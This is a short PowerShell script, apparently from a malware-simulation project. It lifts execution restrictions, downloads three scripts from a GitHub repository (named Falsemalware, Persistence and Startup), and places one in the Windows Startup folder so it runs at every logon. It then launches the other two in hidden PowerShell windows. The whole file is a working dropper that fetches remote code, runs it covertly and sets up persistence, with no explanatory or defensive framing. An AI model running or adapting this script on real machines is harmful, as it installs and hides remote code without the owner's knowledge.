Set-ExecutionPolicy Unrestricted
$url = "https://github.com/Freecil/Prjoetls/blob/475c44bf721eca0f17cef81af241f9971d8c929e/Falsemalware.ps1"
$url3 = "https://github.com/Freecil/Prjoetls/blob/371f0c98311f52559748f1f963179872c8aea582/Persistence.ps1"
$url4 = "https://github.com/Freecil/Prjoetls/blob/b7721dec175d66f83df5febcb78595dc1f229fe6/Startup.cmd"
$FileFalsemalware = "C:\temp\Falsemalware.ps1"
$FilePeristence = "C:\temp\Persistence.ps1"
$FileStartup = "%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Startup.cmd"

Invoke-WebRequest -Uri $url -OutFile $FileFalsemalware
Invoke-WebRequest -Uri $url3 -OutFile $FilePeristence
Invoke-WebRequest -Uri $url4 -OutFile $FileStartup


Start-Process -FilePath PowerShell.exe -WindowStyle hidden -ArgumentList "-File $FileFalsemalware" 
Start-Process -FilePath PowerShell.exe -WindowStyle hidden -ArgumentList "-File $FilePeristence" 


